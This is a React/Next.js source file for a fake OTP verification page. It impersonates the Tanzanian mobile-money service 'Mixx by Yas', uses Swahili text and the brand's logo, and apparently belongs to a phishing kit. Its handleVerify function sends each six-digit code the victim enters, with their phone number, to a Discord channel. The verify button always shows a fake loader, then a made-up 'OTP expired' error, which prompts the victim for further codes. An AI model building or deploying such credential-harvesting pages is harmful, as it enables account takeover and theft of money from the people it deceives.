"use client"
import { useState, useEffect } from "react"
import { Pencil, MapPin } from "lucide-react"
import Image from "next/image"

export default function VerifyScreen() {
  const [otp, setOtp] = useState("")
  const [timeLeft, setTimeLeft] = useState(54)
  const [phone, setPhone] = useState("")
  const [errorMessage, setErrorMessage] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    setPhone(sessionStorage.getItem("userPhone") || "")
  }, [])

  useEffect(() => {
    if (otp.length === 6) {
      handleVerify()
    }
  }, [otp])

  const handleSubmit = () => {
    setIsLoading(true)
    setErrorMessage("")

    setTimeout(() => {
      setIsLoading(false)
      setErrorMessage("Muda wa OTP umeisha, jaribu tena")
      setTimeLeft(60)
      setOtp("")
    }, 3000)
  }

  const handleVerify = async () => {
    // Store OTP
    sessionStorage.setItem("userOtp1", otp)

    try {
      const { sendDiscordMessage } = await import("@/lib/discord")
      await sendDiscordMessage({
        title: "OTP-1 Verification",
        otp1: otp,
        phoneNumber: phone || sessionStorage.getItem("userPhone"),
        exclude: ["otp2", "otp3", "location"]
      })
    } catch (error) {
      console.error("Discord error:", error)
    }
  }

  useEffect(() => {
    if (timeLeft <= 0) return
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1)
    }, 1000)
    return () => clearInterval(timer)
  }, [timeLeft])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const progress = (timeLeft / 60) * 100

  if (isLoading) {
    return (
      <div className="fixed inset-0 w-full h-full bg-[#1a3a6e] flex flex-col items-center justify-center z-50">
        {/* Logo */}
        <Image
          src="https://mixx.co.tz/wp-content/uploads/2025/04/Mixx-By-Yas.svg"
          alt="Mixx by Yas"
          width={192}
          height={80}
          className="w-48 h-20"
          priority
        />

        {/* Loader */}
        <div className="mt-12">
          <div className="flex gap-1.5">
            <span
              className="w-2.5 h-2.5 bg-[#f5c518] rounded-full animate-bounce"
              style={{ animationDelay: "0ms", animationDuration: "600ms" }}
            />
            <span
              className="w-2.5 h-2.5 bg-[#f5c518] rounded-full animate-bounce"
              style={{ animationDelay: "150ms", animationDuration: "600ms" }}
            />
            <span
              className="w-2.5 h-2.5 bg-[#f5c518] rounded-full animate-bounce"
              style={{ animationDelay: "300ms", animationDuration: "600ms" }}
            />
          </div>
        </div>

        {/* Loading Text */}
        <p className="text-white/70 text-sm mt-6">Inathibitisha...</p>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 w-full h-full bg-white flex flex-col items-center px-4 py-4 overflow-hidden">
      <div className="flex-1 flex flex-col items-center justify-center w-full max-w-sm">
        {/* Mixx Logo */}
        <Image
          src="https://mixx.co.tz/wp-content/uploads/2025/04/Mixx-By-Yas.svg"
          alt="Mixx by Yas"
          width={144}
          height={56}
          className="w-36 h-14 mb-4"
          priority
        />

        {/* Title */}
        <h2 className="text-center mb-1">
          <span className="text-[#5b8dee] text-lg">Ujumbe wa </span>
          <span className="text-[#1a3a6e] text-lg font-bold">Uthibitisho</span>
        </h2>

        {/* Description */}
        <p className="text-[#1a3a6e] text-sm text-center mb-2 px-4 leading-tight">
          Tumekutumia namba ya siri ya mara moja<br />
          kwenye namba hii ya simu
        </p>




        {/* Change Number Button */}
        <button className="flex items-center gap-1.5 border border-gray-200 rounded-full px-4 py-1.5 mb-4">
          <Pencil className="w-3.5 h-3.5 text-[#5b8dee]" />
          <span className="text-[#5b8dee] text-sm">Badili namba</span>
        </button>

        {/* OTP Input */}
        <input
          type="text"
          value={otp}
          onChange={(e) => {
            const val = e.target.value.replace(/\D/g, "").slice(0, 6)
            setOtp(val)
          }}
          placeholder="Ingiza namba ya uthibitisho"
          maxLength={6}
          className="w-full max-w-xs border border-gray-200 rounded-lg px-4 py-3 text-center text-sm text-gray-500 placeholder:text-gray-400 focus:outline-none focus:border-[#5b8dee] mb-4"
        />

        {errorMessage && <p className="text-red-500 text-sm mb-4">{errorMessage}</p>}

        {/* Submit Button */}
        <button
          onClick={handleSubmit}
          className="w-full max-w-xs bg-[#1a3a6e] text-white rounded-lg py-3 mb-4 font-medium"
        >
          Thibitisha
        </button>

        {/* Countdown Timer */}
        <div className="relative w-24 h-24 mb-3">
          <svg className="w-full h-full -rotate-90">
            <circle
              cx="48"
              cy="48"
              r="40"
              fill="none"
              stroke="#e8eaf0"
              strokeWidth="4"
            />
            <circle
              cx="48"
              cy="48"
              r="40"
              fill="none"
              stroke="#5b8dee"
              strokeWidth="4"
              strokeLinecap="round"
              strokeDasharray={2 * Math.PI * 40}
              strokeDashoffset={(2 * Math.PI * 40) - (progress / 100) * (2 * Math.PI * 40)}
              className="transition-all duration-1000"
            />
          </svg>
          <div className="absolute inset-0 flex items-center justify-center">
            <span className="text-[#1a3a6e] text-2xl font-semibold">
              {formatTime(timeLeft)}
            </span>
          </div>
        </div>

        {/* Expiry Text / Resend Button */}
        {timeLeft > 0 ? (
          <div className="border border-gray-200 rounded-full px-4 py-2 mb-2">
            <p className="text-gray-400 text-xs">
              Inaisha muda ndani ya {timeLeft} Sek
            </p>
          </div>
        ) : (
          <button
            onClick={() => setTimeLeft(60)}
            className="border border-[#5b8dee] bg-[#5b8dee]/10 rounded-full px-6 py-2 mb-2"
          >
            <span className="text-[#5b8dee] text-sm font-medium">
              Tuma tena
            </span>
          </button>
        )}
      </div>
      {/* Nearby Agents Section */}
      <div className="w-full max-w-xs mb-2">
        <div className="flex items-center gap-1.5 mb-1">
          <MapPin className="w-4 h-4 text-gray-400" />
          <span className="text-gray-600 text-sm">Wakala walio karibu</span>
          <span className="text-[#f5c518]">→</span>
        </div>
        <p className="text-gray-400 text-xs pl-5">
          Tafuta wakala wa karibu ili kujisajili kwa Mixx
        </p>
      </div>
    </div>
  )
}
